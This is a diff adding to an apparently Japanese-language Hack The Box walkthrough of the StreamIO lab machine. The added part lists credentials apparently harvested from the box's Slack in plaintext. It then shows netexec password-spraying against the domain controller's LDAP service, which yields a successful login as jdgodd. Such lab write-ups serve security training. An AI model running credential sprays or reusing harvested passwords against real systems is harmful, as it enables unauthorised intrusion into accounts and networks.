@@ -1188,3 +1188,17 @@ https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
 https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
 https://slack.streamio.htb:b'JDgodd',b'password@12'
 ```
+４つのユーザのうち、nikk37のパスワードは判明・c:\users\配下にadminは存在しないことを確認済み  
+yoshihideとJDgoddでブルートフォースログイン、結果jdgoddでログイン成功
+```sh
+└─$ netexec ldap 10.129.234.107 -u yohsihide -p passwords.txt
+LDAP        10.129.234.107  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
+LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:JDg0dd1s@d0p3cr3@t0r 
+LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:n1kk1sd0p3t00:)' 
+LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:paddpadd@12' 
+LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:password@12' 
+
+└─$ netexec ldap 10.129.234.107 -u jdgodd -p passwords.txt
+LDAP        10.129.234.107  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
+LDAP        10.129.234.107  389    DC               [+] streamIO.htb\jdgodd:JDg0dd1s@d0p3cr3@t0r 
+```
